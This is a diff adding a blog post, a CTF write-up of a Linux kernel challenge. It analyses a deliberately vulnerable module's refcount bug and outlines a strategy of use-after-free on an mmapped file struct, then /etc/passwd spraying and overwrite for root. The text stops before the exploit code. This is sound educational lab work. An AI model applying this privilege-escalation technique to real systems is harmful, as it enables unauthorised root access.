@@ -1,0 +1,1119 @@
+<!doctype html>
+<html class="not-ready lg:text-base" lang="en">
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+
+  <!-- Title -->
+  <title>
+    A &quot;Gau-Hack&quot; from EuskalHack - gum3t
+  </title>
+
+  <!-- Meta -->
+  <meta name="theme-color" />
+
+  
+  <!-- Author -->
+  
+  <!---->
+  
+  <meta name="description" content="A &quot;Gau-Hack&quot; from EuskalHack" />
+  <meta name="author" content="A &amp;quot;Gau-Hack&amp;quot; from EuskalHack" />
+  <!-- The Open Graph protocol -->
+  <meta property="og:type" content="website" />
+  <meta property="og:title" content="A &quot;Gau-Hack&quot; from EuskalHack" />
+  <meta property="og:site_name" content="gum3t" />
+  <meta property="og:description" content="A &quot;Gau-Hack&quot; from EuskalHack" />
+  <meta property="og:url" content="https:&#x2F;&#x2F;gum3t.xyz&#x2F;posts&#x2F;a-gau-hack-from-euskalhack&#x2F;" />
+  
+  <!---->
+  
+  <meta property="og:image" content="https://gum3t.xyz/images/movaps_logo_barretina.png" />
+  
+  <!---->
+  
+
+  <!-- CSS & JS -->
+  <link rel="preload stylesheet" as="style" href="https://gum3t.xyz/main.css" />
+  <style>
+    :root {
+      --bg: #f4f4f5;
+      --bg-dark: #18181b;
+      --header: #e4e4e7;
+      --header-dark: #27272a;
+    }
+  </style>
+
+  
+
+  <!-- Dark Icon -->
+  <link rel="preload" as="image" href="https://gum3t.xyz/icons/theme.svg" />
+
+  <!-- Math -->
+  
+  <!---->
+
+  <!-- Mermaid -->
+  
+  <!---->
+
+  <!-- Favicon -->
+  <link rel="icon" href="https://gum3t.xyz/favicon.ico" />
+  <link rel="apple-touch-icon" href="https://gum3t.xyz/apple-touch-icon.png" />
+
+  <!-- Feeds -->
+  
+  <!---->
+  
+  <link
+    rel="alternate"
+    type="application/atom+xml"
+    title="Atom"
+    href="https://gum3t.xyz/atom.xml"
+  />
+  
+  
+  <!---->
+  
+
+  <!-- Canonical -->
+  <link rel="canonical" href="https:&#x2F;&#x2F;gum3t.xyz&#x2F;posts&#x2F;a-gau-hack-from-euskalhack&#x2F;" />
+</head>
+
+  <body class="text-black duration-200 ease-out dark:text-white">
+    <header
+  class="header fixed top-0 z-40 mx-auto min-h-[3.5rem] w-full"
+>
+  <div class="mx-auto w-full max-w-4xl p-3 lg:flex lg:justify-between">
+    <div class="flex justify-between">
+      <div class="flex items-center">
+        <a class="text-2xl font-semibold" href="https://gum3t.xyz">gum3t</a>
+        <div
+          class="btn-dark ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] [background:url(./icons/theme.svg)_left_center/cover_no-repeat] dark:invert dark:[background-position:right]"
+          role="button"
+          aria-label="Dark"
+        ></div>
+      </div>
+      
+      <div
+        class="btn-menu relative z-50 flex h-8 w-8 shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
+        role="button"
+        aria-label="Menu"
+      ></div>
+      
+    </div>
+    <script>
+      // base
+      const htmlClass = document.documentElement.classList;
+      setTimeout(() => {
+        htmlClass.remove("not-ready");
+      }, 10);
+
+      // mobile menu
+      const btnMenu = document.querySelector(".btn-menu");
+      btnMenu?.addEventListener("click", () => {
+        htmlClass.toggle("open");
+      });
+
+      // dark theme
+      const setDark = (isDark) => {
+        if (isDark) {
+          document.body.dispatchEvent(new CustomEvent("set-theme", { detail: "dark" }));
+          htmlClass.add("dark");
+        } else {
+          document.body.dispatchEvent(new CustomEvent("set-theme", { detail: "light" }));
+          htmlClass.remove("dark");
+        }
+        localStorage.setItem("dark", isDark);
+      };
+
+      // init
+      const darkScheme = window.matchMedia("(prefers-color-scheme: dark)");
+      if (htmlClass.contains("dark")) {
+        setDark(true);
+      } else {
+        const darkVal = localStorage.getItem("dark");
+        setDark(darkVal ? darkVal === "true" : darkScheme.matches);
+      }
+
+      // listen system
+      darkScheme.addEventListener("change", (event) => {
+        setDark(event.matches);
+      });
+
+      // manual switch
+      const btnDark = document.querySelector(".btn-dark");
+      btnDark.addEventListener("click", () => {
+        setDark(localStorage.getItem("dark") !== "true");
+      });
+    </script>
+    
+    <nav class="flex w-full items-center lg:w-auto">
+      <ul
+        class="nav-wrapper flex w-full flex-col py-2 lg:w-auto lg:flex-row lg:self-center lg:py-0"
+      >
+        
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://gum3t.xyz/posts"
+            >posts</a
+          >
+        </li>
+        
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://gum3t.xyz/tags"
+            >tags</a
+          >
+        </li>
+        
+      </ul>
+    </nav>
+    
+  </div>
+</header>
+
+
+    <style>
+	code::before, code::after {
+   	    content: none !important;
+	}
+	p {
+	    text-align: justify;
+            text-justify: inter-word;
+	}
+    </style>
+
+    <main
+      class="prose prose-neutral relative mx-auto min-h-[calc(100%-9rem)] max-w-4xl break-words px-4 pb-16 pt-32 dark:prose-invert"
+    >
+      
+<article>
+  <header class="mb-16">
+    <h1 class="!my-0 pb-2.5">A &quot;Gau-Hack&quot; from EuskalHack</h1>
+    <div class="text-sm antialiased opacity-60">
+  
+  <time>2024-06-30</time>
+  <span class="mx-1">&middot;</span>
+  <span>20min</span>
+  <!---->
+  
+  <!---->
+  
+  <span class="mx-1">&middot;</span>
+  <span>gum3t</span>
+  
+</div>
+
+  </header>
+
+  
+
+  <!-- TOC -->
+  <!---->
+<div class="block-bg mb-12 flex rounded-lg p-2 text-lg">
+  <details>
+    <summary class="cursor-pointer py-1 pl-4">
+      <span>Table of Contents</span>
+    </summary>
+    <div class="px-2">
+      <ul>
+        
+        <li>
+          <a class="no-underline hover:underline" href="https://gum3t.xyz/posts/a-gau-hack-from-euskalhack/#source-code-analysis"
+            >Source Code Analysis</a
+          >
+          
+          <ul>
+            
+            <li>
+              <a class="no-underline hover:underline" href="https://gum3t.xyz/posts/a-gau-hack-from-euskalhack/#install-file"
+                >install_file</a
+              >
+            </li>
+            
+            <li>
+              <a class="no-underline hover:underline" href="https://gum3t.xyz/posts/a-gau-hack-from-euskalhack/#close-file"
+                >close_file</a
+              >
+            </li>
+            
+          </ul>
+          
+        </li>
+        
+        <li>
+          <a class="no-underline hover:underline" href="https://gum3t.xyz/posts/a-gau-hack-from-euskalhack/#exploit-strategy"
+            >Exploit Strategy</a
+          >
+          
+        </li>
+        
+        <li>
+          <a class="no-underline hover:underline" href="https://gum3t.xyz/posts/a-gau-hack-from-euskalhack/#exploit-development"
+            >Exploit Development</a
+          >
+          
+          <ul>
+            
+            <li>
+              <a class="no-underline hover:underline" href="https://gum3t.xyz/posts/a-gau-hack-from-euskalhack/#create-a-temporary-file"
+                >Create a temporary file</a
+              >
+            </li>
+            
+            <li>
+              <a class="no-underline hover:underline" href="https://gum3t.xyz/posts/a-gau-hack-from-euskalhack/#map-the-temporary-file"
+                >Map the temporary file</a
+              >
+            </li>
+            
+            <li>
+              <a class="no-underline hover:underline" href="https://gum3t.xyz/posts/a-gau-hack-from-euskalhack/#drop-f-count-to-0"
+                >Drop f_count to 0</a
+              >
+            </li>
+            
+            <li>
+              <a class="no-underline hover:underline" href="https://gum3t.xyz/posts/a-gau-hack-from-euskalhack/#etc-passwd-spraying"
+                >&#x2F;etc&#x2F;passwd spraying</a
+              >
+            </li>
+            
+            <li>
+              <a class="no-underline hover:underline" href="https://gum3t.xyz/posts/a-gau-hack-from-euskalhack/#overwrite-etc-passwd"
+                >Overwrite &#x2F;etc&#x2F;passwd</a
+              >
+            </li>
+            
+            <li>
+              <a class="no-underline hover:underline" href="https://gum3t.xyz/posts/a-gau-hack-from-euskalhack/#avoid-kernel-memory-problems"
+                >Avoid kernel memory problems</a
+              >
+            </li>
+            
+            <li>
+              <a class="no-underline hover:underline" href="https://gum3t.xyz/posts/a-gau-hack-from-euskalhack/#have-fun"
+                >Have fun :)</a
+              >
+            </li>
+            
+          </ul>
+          
+        </li>
+        
+        <li>
+          <a class="no-underline hover:underline" href="https://gum3t.xyz/posts/a-gau-hack-from-euskalhack/#final-exploit"
+            >Final Exploit</a
+          >
+          
+        </li>
+        
+      </ul>
+    </div>
+  </details>
+</div>
+
+<!---->
+
+  <!-- Content -->
+  <section><p>This is a kernel exploitation challenge created by <a href="https://x.com/javierprtd">@javierprtd</a>.</p>
+<p>In this challenge, we are given the source code of a vulnerable LKM (<code>ctf.c</code>), its Makefile and some code in C as a proof of concept on how to interact with the LKM (<code>poc.c</code>).</p>
+<p>To be able to debug this LKM, we need a kernel image (I used <code>linux-6.6.34</code>), and a file system (I modified an <code>initramfs</code> image from an older CTF challenge).</p>
+<p>This is the bash script used to run the kernel image within QEMU:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#65737e;">#!/bin/bash
+</span><span>
+</span><span style="color:#bf616a;">qemu-system-x86_64 </span><span>\
+</span><span style="color:#bf616a;">    -cpu</span><span> kvm64,+smep,+smap \
+</span><span style="color:#bf616a;">    -m</span><span> 256M \
+</span><span style="color:#bf616a;">    -nographic </span><span>\
+</span><span style="color:#bf616a;">    -kernel</span><span> bzImage-6.6.34 \
+</span><span style="color:#bf616a;">    -append </span><span>&#39;</span><span style="color:#a3be8c;">console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr</span><span>&#39; \
+</span><span style="color:#bf616a;">    -monitor</span><span> /dev/null \
+</span><span style="color:#bf616a;">    -initrd</span><span> initramfs.cpio.gz \
+</span><span style="color:#bf616a;">    -s
+</span></code></pre>
+<p>The <code>init</code> file used within <code>initramfs</code> is the following:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#65737e;">#!/bin/sh
+</span><span>
+</span><span style="color:#bf616a;">chown -hR</span><span> root: /
+</span><span style="color:#bf616a;">chown -R</span><span> user: /home/user
+</span><span>
+</span><span style="color:#bf616a;">chmod</span><span> 0755</span><span style="color:#bf616a;"> -R</span><span> /
+</span><span style="color:#bf616a;">chmod</span><span> 0700</span><span style="color:#bf616a;"> -R</span><span> /root/
+</span><span style="color:#bf616a;">chmod</span><span> 0 /flag
+</span><span style="color:#bf616a;">chmod</span><span> u+s /bin/su
+</span><span>
+</span><span style="color:#bf616a;">mount -t</span><span> proc none /proc
+</span><span style="color:#bf616a;">mount -t</span><span> sysfs none /sys
+</span><span style="color:#bf616a;">mount -t</span><span> devtmpfs none /dev
+</span><span style="color:#bf616a;">mkdir -p</span><span> /dev/pts
+</span><span style="color:#bf616a;">mount -vt</span><span> devpts</span><span style="color:#bf616a;"> -o</span><span> gid=4,mode=620 none /dev/pts
+</span><span>
+</span><span style="color:#bf616a;">/sbin/mdev -s
+</span><span>
+</span><span style="color:#65737e;"># Disable boot at kernel panic
+</span><span style="color:#96b5b4;">echo </span><span>&quot;</span><span style="color:#a3be8c;">kernel.panic = 0</span><span>&quot; &gt; /etc/sysctl.conf
+</span><span style="color:#bf616a;">sysctl -p
+</span><span>
+</span><span style="color:#65737e;"># ifup eth0 &gt;&amp; /dev/null
+</span><span>
+</span><span style="color:#96b5b4;">cd</span><span> /root
+</span><span style="color:#bf616a;">cat</span><span> /etc/banner.txt
+</span><span>
+</span><span style="color:#bf616a;">insmod</span><span> /chall/ctf.ko
+</span><span>
+</span><span style="color:#96b5b4;">cd</span><span> /home/user
+</span><span style="color:#65737e;"># final mode
+</span><span style="color:#bf616a;">setsid</span><span> cttyhack setuidgid 1000 sh
+</span><span style="color:#65737e;"># test mode
+</span><span style="color:#65737e;"># setsid cttyhack setuidgid 0 sh
+</span><span>
+</span><span style="color:#bf616a;">poweroff -f
+</span></code></pre>
+<p>And to update the compressed <code>initramfs</code> image, I use the following script:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">gcc -o</span><span> exploit</span><span style="color:#bf616a;"> -static </span><span>$</span><span style="color:#bf616a;">1
+</span><span style="color:#bf616a;">gcc -o</span><span> poc</span><span style="color:#bf616a;"> -static</span><span> poc.c
+</span><span style="color:#bf616a;">cp</span><span> ./exploit ./initramfs/home/user
+</span><span style="color:#bf616a;">cp</span><span> ./poc ./initramfs/home/user
+</span><span style="color:#96b5b4;">cd</span><span> initramfs
+</span><span style="color:#bf616a;">find</span><span> .</span><span style="color:#bf616a;"> -print0 </span><span>\
+</span><span>| </span><span style="color:#bf616a;">cpio --null -ov --format</span><span>=newc \
+</span><span>| </span><span style="color:#bf616a;">gzip -9 </span><span>&gt; initramfs.cpio.gz
+</span><span style="color:#bf616a;">mv</span><span> ./initramfs.cpio.gz ../
+</span></code></pre>
+<h2 id="source-code-analysis">Source Code Analysis</h2>
+<p>If we check the provided source code for the vulnerable LKM, we can identify two main functions within ioctl:</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#b48ead;">static long </span><span style="color:#8fa1b3;">ctf_ioctl</span><span>(</span><span style="color:#b48ead;">struct</span><span> file *</span><span style="color:#bf616a;">file</span><span>, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">code</span><span>, </span><span style="color:#b48ead;">unsigned long </span><span style="color:#bf616a;">arg</span><span>) {
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">switch </span><span>(code) {
+</span><span>        </span><span style="color:#b48ead;">case</span><span> IOCTL_CTF_INSTALL_FILE:
+</span><span>            </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">install_file</span><span>((</span><span style="color:#b48ead;">int </span><span>* __user) arg);
+</span><span>
+</span><span>        </span><span style="color:#b48ead;">case</span><span> IOCTL_CTF_CLOSE_FILE:
+</span><span>            </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">close_file</span><span>((</span><span style="color:#b48ead;">int </span><span>* __user) arg);
+</span><span>
+</span><span>        </span><span style="color:#b48ead;">default</span><span>:
+</span><span>            </span><span style="color:#b48ead;">return </span><span>-EINVAL;
+</span><span>    }
+</span><span>
+</span><span>}
+</span></code></pre>
+<h3 id="install-file">install_file</h3>
+<p>We can see below the content of the <code>install_file</code> function:</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">install_file</span><span>(</span><span style="color:#b48ead;">int </span><span>* __user </span><span style="color:#bf616a;">arg</span><span>) {
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">int</span><span> ret = </span><span style="color:#d08770;">0</span><span>;
+</span><span>	</span><span style="color:#b48ead;">int</span><span> fd;
+</span><span>	</span><span style="color:#b48ead;">struct</span><span> files_struct *files;
+</span><span>	</span><span style="color:#b48ead;">struct</span><span> file *file;
+</span><span>	</span><span style="color:#b48ead;">struct</span><span> fdtable *fdt;
+</span><span>	
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(</span><span style="color:#bf616a;">copy_from_user</span><span>(&amp;fd, arg, sizeof(</span><span style="color:#b48ead;">int</span><span>))) {
+</span><span>		</span><span style="color:#bf616a;">pr_err</span><span>(&quot;</span><span style="color:#a3be8c;">error copy_from_user</span><span style="color:#96b5b4;">\n</span><span>&quot;);
+</span><span>		</span><span style="color:#b48ead;">return </span><span>-EFAULT;
+</span><span>	}
+</span><span> 
+</span><span>	files = current-&gt;files;
+</span><span>	
+</span><span>	</span><span style="color:#bf616a;">spin_lock</span><span>(&amp;files-&gt;file_lock);
+</span><span>	
+</span><span>	fdt = </span><span style="color:#bf616a;">files_fdtable</span><span>(files);
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(fd &gt;= fdt-&gt;max_fds)
+</span><span>		</span><span style="color:#b48ead;">return </span><span>-EBADF;
+</span><span>
+</span><span>	file = fdt-&gt;fd[fd];
+</span><span>	
+</span><span>	</span><span style="color:#bf616a;">spin_unlock</span><span>(&amp;files-&gt;file_lock);
+</span><span>
+</span><span>	ret = </span><span style="color:#bf616a;">get_unused_fd_flags</span><span>(</span><span style="color:#d08770;">0</span><span>);
+</span><span>	
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(ret &lt; </span><span style="color:#d08770;">0</span><span>) {
+</span><span>		</span><span style="color:#b48ead;">goto</span><span> error;
+</span><span>	}
+</span><span>	
+</span><span>	</span><span style="color:#bf616a;">get_file</span><span>(file);
+</span><span>	
+</span><span>	</span><span style="color:#bf616a;">fd_install</span><span>(ret, file);
+</span><span>	
+</span><span>	</span><span style="color:#b48ead;">return</span><span> ret;
+</span><span>	
+</span><span>error:
+</span><span>	</span><span style="color:#bf616a;">fput</span><span>(file);
+</span><span>	</span><span style="color:#b48ead;">return </span><span>-EBADF;
+</span><span>}
+</span></code></pre>
+<p>Overall, we can say this function is pretty similar to a <code>dup</code> syscall.</p>
+<p>If we look closely, we can see that this function initially receives a file descriptor from the user-space, then it gets the current process <em>files_struct</em> structure and later it locks the <em>files_struct</em> struct.</p>
+<p>Inside the lock, it retrieves the file descriptor table of the process, checks if the given file descriptor is valid and retrieves the <em>file</em> struct that corresponds to the given file descriptor. The <em>files_struct</em> lock is released after this part.</p>
+<p>After the lock release, a new file descriptor is allocated with <code>get_unused_fd_flags(0)</code>, the <code>file-&gt;f_count-&gt;counter</code> (from now on, <code>f_count</code>)  is incremented by one and finally, the file descriptor is associated with the <em>file</em> struct in the file descriptor table of the running process.</p>
+<p>The error management just decrements <code>f_count</code> by one with <code>fput(file)</code> and returns <code>EBADF</code>. This part is pretty interesting as we will see later on.</p>
+<h3 id="close-file">close_file</h3>
+<p>We can see the below the content of the <code>close_file</code> function:</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">close_file</span><span>(</span><span style="color:#b48ead;">int </span><span>* __user </span><span style="color:#bf616a;">arg</span><span>) {
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">int</span><span> fd;
+</span><span>	</span><span style="color:#b48ead;">struct</span><span> files_struct *files;
+</span><span>	</span><span style="color:#b48ead;">struct</span><span> file *file;
+</span><span>	</span><span style="color:#b48ead;">struct</span><span> fdtable *fdt;
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(</span><span style="color:#bf616a;">copy_from_user</span><span>(&amp;fd, arg, sizeof(</span><span style="color:#b48ead;">int</span><span>))) {
+</span><span>		</span><span style="color:#bf616a;">pr_err</span><span>(&quot;</span><span style="color:#a3be8c;">error copy_from_user</span><span style="color:#96b5b4;">\n</span><span>&quot;);
+</span><span>		</span><span style="color:#b48ead;">return </span><span>-EFAULT;
+</span><span>	}
+</span><span>
+</span><span>	files = current-&gt;files;
+</span><span>
+</span><span>	</span><span style="color:#bf616a;">spin_lock</span><span>(&amp;files-&gt;file_lock);
+</span><span>	
+</span><span>	fdt = </span><span style="color:#bf616a;">files_fdtable</span><span>(files);
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(fd &gt;= fdt-&gt;max_fds)
+</span><span>		</span><span style="color:#b48ead;">return </span><span>-EBADF;
+</span><span>
+</span><span>	file = fdt-&gt;fd[fd];
+</span><span>	
+</span><span>	</span><span style="color:#bf616a;">spin_unlock</span><span>(&amp;files-&gt;file_lock);
+</span><span>	
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(file) {
+</span><span>		</span><span style="color:#bf616a;">rcu_assign_pointer</span><span>(fdt-&gt;fd[fd], </span><span style="color:#d08770;">NULL</span><span>);
+</span><span>		
+</span><span>		</span><span style="color:#bf616a;">__clear_bit</span><span>(fd, fdt-&gt;open_fds);
+</span><span>		</span><span style="color:#bf616a;">__clear_bit</span><span>(fd / BITS_PER_LONG, fdt-&gt;full_fds_bits);
+</span><span>		
+</span><span>		</span><span style="color:#b48ead;">if </span><span>(fd &lt; files-&gt;next_fd)
+</span><span>			files-&gt;next_fd = fd;
+</span><span>	}
+</span><span>	
+</span><span>	</span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">filp_close</span><span>(file, files);
+</span><span>}
+</span></code></pre>
+<p>This function is very similar to <code>close</code> syscall.</p>
+<p>Until the <em>files_struct</em> lock release, this function behaves the same way as <code>install_file</code> does.</p>
+<p>After the lock release, the given file descriptor is set to <code>NULL</code> and its corresponding bits are cleared in the bitmap. Later checks if it is necessary to update <code>next_fd</code> from <em>files_struct</em>.</p>
+<p>Finally, the file struct <code>f_count</code> is decremented with <code>filp_close(file, files)</code>.</p>
+<h2 id="exploit-strategy">Exploit Strategy</h2>
+<p>By the time I started this challenge I had very little idea on how this could be exploited and I did some research where I could find this could technically be exploited through race conditions between the file description is assigned to the file struct and the new file descriptor is returned to the user. This can be checked <a href="https://i.blackhat.com/USA-22/Wednesday/US-22-Wu-Devils-Are-in-the-File.pdf">here</a>.</p>
+<p>However, the intended solve is easier. If we check the error management of the <code>get_unused_fd_flags(0)</code> function within <code>install_file</code>, we can see there is something off.</p>
+<p>The important fragment of code is the following:</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span>	ret = </span><span style="color:#bf616a;">get_unused_fd_flags</span><span>(</span><span style="color:#d08770;">0</span><span>);
+</span><span>	
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(ret &lt; </span><span style="color:#d08770;">0</span><span>) {
+</span><span>		</span><span style="color:#b48ead;">goto</span><span> error;
+</span><span>	}
+</span><span>	
+</span><span>	</span><span style="color:#bf616a;">get_file</span><span>(file);
+</span><span>
+</span><span>	...
+</span><span>error:
+</span><span>	</span><span style="color:#bf616a;">fput</span><span>(file);
+</span><span>	</span><span style="color:#b48ead;">return </span><span>-EBADF;
+</span></code></pre>
+<p>If we can force <code>get_unused_fd_flags(0)</code> to fail, the <em>file</em> struct <code>f_count</code> will be decremented. This is a problem because at this moment, the <code>f_count</code> still has not been modified as it is incremented in <code>get_file(file)</code> function. This would allow us to decrement a file's <code>f_count</code> at our will, which by the time it reaches <code>0</code>, the <em>file</em> struct will be released/freed. This means that we could have the ability to free any <em>file</em> struct we control with a file descriptor.</p>
+<p>But how can we force <code>get_unused_fd_flags(0)</code> to fail? There's a command called <code>prlimit</code> that modifies the resource limits of a given process. In <code>C</code>, we can use <code>prlimit</code> or <code>setprlimit</code> to modify the max number of open files (<code>RLIMIT_NOFILE</code>) a process can have. If we reach this limit, <code>get_unused_fd_flags(0)</code> will always return an error.</p>
+<p>Ok, so by this moment, we have found a way to free <em>file</em> structs. Now we need to leverage this to a UAF.
+To achieve this goal, we can check on how <code>mmap()</code> works.</p>
+<p>When <code>mmap()</code> asks for memory, the requested pages are not instantly mapped into memory. Instead, by the time you access the mapped region, it produces a <code>page fault</code> that, when handled, loads the requested pages.</p>
+<p>As a useful example, let's check what happens in the kernel. We can map a temporary file into memory. Here, a <em>file</em> struct is assigned to the mapped region. Later, <code>call_mmap()</code> is called, which is a wrapper for <code>file-&gt;f_op-&gt;mmap()</code>.</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#65737e;">// mmap.c
+</span><span style="color:#65737e;">// https://elixir.bootlin.com/linux/v6.6.34/source/mm/mmap.c#L2781
+</span><span style="color:#b48ead;">unsigned long </span><span style="color:#8fa1b3;">mmap_region</span><span>(</span><span style="color:#b48ead;">struct</span><span> file *</span><span style="color:#bf616a;">file</span><span>, </span><span style="color:#b48ead;">unsigned long </span><span style="color:#bf616a;">addr</span><span>,
+</span><span>		</span><span style="color:#b48ead;">unsigned long </span><span style="color:#bf616a;">len</span><span>, vm_flags_t </span><span style="color:#bf616a;">vm_flags</span><span>, </span><span style="color:#b48ead;">unsigned long </span><span style="color:#bf616a;">pgoff</span><span>,
+</span><span>		</span><span style="color:#b48ead;">struct</span><span> list_head *</span><span style="color:#bf616a;">uf</span><span>)
+</span><span>{
+</span><span>	...
+</span><span>		vma-&gt;vm_file = </span><span style="color:#bf616a;">get_file</span><span>(file);
+</span><span>		error = </span><span style="color:#bf616a;">call_mmap</span><span>(file, vma);
+</span><span>	...
+</span><span>
+</span><span style="color:#65737e;">// fs.h
+</span><span style="color:#65737e;">// https://elixir.bootlin.com/linux/v6.6.34/source/include/linux/fs.h#L2020
+</span><span style="color:#b48ead;">static inline int </span><span style="color:#bf616a;">call_mmap</span><span>(</span><span style="color:#b48ead;">struct</span><span> file *file, </span><span style="color:#b48ead;">struct</span><span> vm_area_struct *vma)
+</span><span>{
+</span><span>	</span><span style="color:#b48ead;">return</span><span> file-&gt;f_op-&gt;</span><span style="color:#bf616a;">mmap</span><span>(file, vma);
+</span><span>}
+</span></code></pre>
+<p>The previously mentioned <code>file-&gt;f_op-&gt;mmap()</code> points to the specific <code>mmap()</code> implementation for the file system that the file resides on. In our case, it is pointing to <code>ext4_file_mmap()</code>.
+Here, we can check how the <code>ext4</code> related operations are assigned:</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#65737e;">// https://elixir.bootlin.com/linux/v6.6.34/source/fs/ext4/file.c#L776
+</span><span style="color:#b48ead;">static const struct</span><span> vm_operations_struct ext4_file_vm_ops = {
+</span><span>	.</span><span style="color:#bf616a;">fault		</span><span>= filemap_fault,
+</span><span>	.</span><span style="color:#bf616a;">map_pages	</span><span>= filemap_map_pages,
+</span><span>	.</span><span style="color:#bf616a;">page_mkwrite   </span><span>= ext4_page_mkwrite,
+</span><span>}
+</span><span>
+</span><span>...
+</span><span>
+</span><span style="color:#65737e;">// https://elixir.bootlin.com/linux/v6.6.34/source/fs/ext4/file.c#L802
+</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">ext4_file_mmap</span><span>(</span><span style="color:#b48ead;">struct</span><span> file *</span><span style="color:#bf616a;">file</span><span>, </span><span style="color:#b48ead;">struct</span><span> vm_area_struct *</span><span style="color:#bf616a;">vma</span><span>)
+</span><span>{
+</span><span>	...
+</span><span>	vma-&gt;vm_ops = &amp;ext4_file_vm_ops;
+</span><span>	...
+</span><span>
+</span></code></pre>
+<p>At this point, the <code>mmap()</code> of the temporary file has finished. However, the mapped region still has not been accessed, so the pages of the file are not mapped into memory yet.
+The first time we try to access the mapped region, a <code>page fault</code> will be triggered so <code>vma-&gt;vm_ops-&gt;fault()</code> will be called:</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#65737e;">// https://elixir.bootlin.com/linux/v6.6.34/source/mm/memory.c#L4227
+</span><span style="color:#b48ead;">static</span><span> vm_fault_t </span><span style="color:#8fa1b3;">__do_fault</span><span>(</span><span style="color:#b48ead;">struct</span><span> vm_fault *</span><span style="color:#bf616a;">vmf</span><span>)
+</span><span>{
+</span><span>	...
+</span><span>	ret = vma-&gt;vm_ops-&gt;</span><span style="color:#bf616a;">fault</span><span>(vmf);
+</span></code></pre>
+<p>As it has been explained before, <code>vma-&gt;vm_ops-&gt;fault()</code> now points to <code>filemap_fault()</code> and here we can see how the actual file is finally accessed, so the file pages can finally be mapped into memory:</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#65737e;">// https://elixir.bootlin.com/linux/v6.6.34/source/mm/filemap.c#L3264
+</span><span>vm_fault_t </span><span style="color:#8fa1b3;">filemap_fault</span><span>(</span><span style="color:#b48ead;">struct</span><span> vm_fault *</span><span style="color:#bf616a;">vmf</span><span>)
+</span><span>{	
+</span><span>	</span><span style="color:#b48ead;">int</span><span> error;
+</span><span>	</span><span style="color:#b48ead;">struct</span><span> file *file = vmf-&gt;vma-&gt;vm_file;
+</span><span>	</span><span style="color:#b48ead;">struct</span><span> file *fpin = </span><span style="color:#d08770;">NULL</span><span>;
+</span><span>	</span><span style="color:#b48ead;">struct</span><span> address_space *mapping = file-&gt;f_mapping;
+</span><span>	</span><span style="color:#b48ead;">struct</span><span> inode *inode = mapping-&gt;host;
+</span><span>	...
+</span></code></pre>
+<p>If we manage to free a <em>file</em> struct after it has been assigned a mapped region, but before this region has been accessed, and then we are capable of filling the freed space with another <em>file</em> struct pointing to another file, we will be able to map the pages of the second file with the permissions of the mapped region, giving us our wanted UAF :)</p>
+<p>Now that we have identified the UAF primitive, we can design a proper strategy to exploit it. To do so, we will go through the following steps:</p>
+<ol>
+<li><strong>Create a temporary file</strong>: create a file with <code>O_RDWR</code> permissions.</li>
+<li><strong>Map the temporary file</strong>: map the file into memory with <code>PROT_READ</code> and <code>PROT_WRITE</code> protections and the <code>MAP_SHARED</code> flag. This way we will be able to write into the desired file after leveraging the UAF primitive.</li>
+<li><strong>Drop <code>f_count</code> to <code>0</code></strong>: drop the file's <code>f_count</code> to <code>0</code> using the previously explained method so the file's <em>file</em> struct is released/freed.</li>
+<li><strong><code>/etc/passwd</code> spraying</strong>: spray <em>file</em> structs pointing to critical files like <code>/etc/passwd</code>. If we manage to allocate one of these <em>file</em> structs where the previous <em>file</em> struct was freed, we can leverage the UAF into an arbitrary read/write.</li>
+<li><strong>Overwrite <code>/etc/passwd</code></strong>: As the pages of the mapped region are allowed to be written, we can write into the mapped <code>/etc/passwd</code> and the changes will be carried through to the underlying file due to the <code>MAP_SHARED</code> flag.</li>
+<li><strong>Avoid kernel memory problems</strong>: Find a way to avoid problems with the messed kernel memory.</li>
+<li><strong>Have fun :)</strong></li>
+</ol>
+<h2 id="exploit-development">Exploit Development</h2>
